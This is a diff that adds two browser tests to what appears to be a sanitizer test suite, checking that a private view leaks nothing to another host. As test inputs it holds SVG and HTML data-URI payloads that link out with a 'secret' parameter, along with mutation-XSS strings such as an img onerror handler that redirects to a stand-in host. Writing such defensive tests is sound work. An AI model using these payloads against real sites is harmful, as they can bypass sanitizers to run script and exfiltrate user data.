@@ -383,6 +383,123 @@ exitTest.describe("a view with private rows is written from an allowlist", () =>
       expect(otherHost.connections).toBe(0);
     }
   );
+
+  exitTest(
+    "it keeps an image only when it is a raster image held in its address",
+    async ({ page, otherHost }) => {
+      const there = otherHost.origin;
+      const png =
+        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
+      // An SVG image loads nothing while it is an image. Opened in a tab of its own it is a
+      // document, and this link in it works.
+      const svg = `<svg xmlns='http://www.w3.org/2000/svg'><a href='${there}/hit?row=secret'><text y='12'>Details</text></a></svg>`;
+      const refused = [
+        `data:image/svg+xml,${encodeURIComponent(svg)}`,
+        `data:image/svg+xml;base64,${Buffer.from(svg).toString("base64")}`,
+        `DATA:IMAGE/SVG+XML,${encodeURIComponent(svg)}`,
+        `  data:image/svg+xml,${encodeURIComponent(svg)}  `,
+        `\tdata:image/svg+xml;base64,${Buffer.from(svg).toString("base64")}`,
+        `data:image/png;x=,image/svg+xml,${encodeURIComponent(svg)}`,
+        `data:text/html,${encodeURIComponent(`<a href="${there}/hit?row=secret">Details</a>`)}`,
+        `data:,${encodeURIComponent(svg)}`,
+        "blob:null/3f0e2a52-7f2c-4a43-9d57-0c1f1f5a8b11",
+        `${there}/hit?img=1`
+      ];
+      const kept = [
+        `data:image/png;base64,${png}`,
+        `DATA:IMAGE/PNG;BASE64,${png}`,
+        ` data:image/png;base64,${png} `
+      ];
+      const image = (source: string, name: string) =>
+        `<img class="${name}" alt="${name}" width="1" height="1" src="${source.replaceAll("&", "&amp;").replaceAll('"', "&quot;")}">`;
+
+      await openView(
+        page,
+        "private_hydrated_view",
+        [
+          ...refused.map((source) => image(source, "refused")),
+          ...kept.map((source) => image(source, "kept"))
+        ].join("")
+      );
+      const composed = await composedDocument(page);
+      const view = viewFrame(page);
+
+      expect(composed).not.toContain(new URL(there).host);
+      expect(composed.toLowerCase()).not.toContain("svg");
+      expect(composed).not.toContain("blob:null");
+      expect(composed).not.toContain("text/html");
+      await expect(view.locator("img.refused")).toHaveCount(refused.length);
+      await expect(view.locator("img.refused[src]")).toHaveCount(0);
+      await expect(view.locator("img.kept")).toHaveCount(kept.length);
+      await expect(view.locator("img.kept[src]")).toHaveCount(kept.length);
+      await expect(view.locator("img.kept").first()).toHaveAttribute(
+        "src",
+        `data:image/png;base64,${png}`
+      );
+
+      await page.waitForTimeout(SETTLE_MS);
+      expect(otherHost.requests).toEqual([]);
+      expect(otherHost.connections).toBe(0);
+    }
+  );
+
+  // The writer runs here on the tree Chromium's parser makes, not on a stub. These are the
+  // places where what a parser reads and what it reads again from its own output differ.
+  exitTest(
+    "it writes nothing that reads differently the second time",
+    async ({ page, otherHost }) => {
+      const there = otherHost.origin;
+      const link = (name: string) => `<a href="${there}/hit?${name}=1" onclick="x()">${name}</a>`;
+      const planted = [
+        // Read as elements where no script runs, as text where one does.
+        `<noscript><p title="</noscript>${link("noscript").replaceAll('"', "&quot;")}">n</p></noscript>`,
+        `<noscript>${link("noscript-child")}</noscript>`,
+        // Its content is in a tree of its own.
+        `<template>${link("template")}<script>x()</script></template>`,
+        // The first closing tag ends a style block, whatever the CSS says.
+        `<style><!--</style>${link("style-comment")}--></style>`,
+        `<style>#kept::after{content:"</style>${link("style-string")}"}</style>`,
+        `<style>#gone{color:red}/*<b>*/</style>`,
+        "<style>#kept{color:rgb(1, 2, 3)}</style>",
+        `<textarea></textarea>${link("after-textarea")}`,
+        `<textarea>${link("textarea")}</textarea>`,
+        `<title>${link("title")}</title><xmp>${link("xmp")}</xmp><plaintext-x>${link("unknown")}</plaintext-x>`,
+        // In SVG and MathML a style block is markup, and some elements switch back to HTML.
+        `<svg><style>${link("svg-style")}</style><desc>${link("svg-desc")}</desc><foreignObject>${link("foreign")}</foreignObject><title>${link("svg-title")}</title><rect id="shape" width="9" height="9"/></svg>`,
+        `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=location.href='${there}'&gt;"></table></mtext><mi>${link("math")}</mi></math>`,
+        `<svg></p><style><a id="</style><img src=1 onerror=location.href='${there}'>"></svg>`,
+        // Comments are not written, and an attribute value that closes one stays a value.
+        `<!--${link("comment")}--><!--><a href="${there}/hit?short=1">short</a>-->`,
+        `<p id="titled" title="--><a href=x>">titled</p>`,
+        '<p id="kept">kept</p>'
+      ].join("");
+
+      await openView(page, "private_hydrated_view", planted);
+      const composed = await composedDocument(page);
+      const view = viewFrame(page);
+
+      // No address survives in any place the view's own parser reads as markup or as an address.
+      await expect(
+        view.locator(
+          "[href], [src], [onclick], [onerror], script, noscript, template, textarea, title, xmp, math, desc, foreignObject, svg style, svg a, plaintext-x"
+        )
+      ).toHaveCount(0);
+      expect(composed).not.toContain("<!--");
+      expect(composed).not.toContain("onerror=");
+      expect(composed).not.toContain('href="');
+      // The links that stood outside what was left out are there as text without an address.
+      const links = view.locator("a");
+      await expect(links).toHaveText(["style-comment", "style-string", "after-textarea", "short"]);
+      await expect(view.locator("#titled")).toHaveAttribute("title", "--><a href=x>");
+      await expect(view.locator("#shape")).toHaveCount(1);
+      await expect(view.locator("#kept")).toHaveText("kept");
+      await expect(view.locator("#kept")).toHaveCSS("color", "rgb(1, 2, 3)");
+
+      await page.waitForTimeout(SETTLE_MS);
+      expect(otherHost.requests).toEqual([]);
+      expect(otherHost.connections).toBe(0);
+    }
+  );
 });
 
 // WebRTC is not HTTP: a script names a server and the browser sends it UDP packets. No content
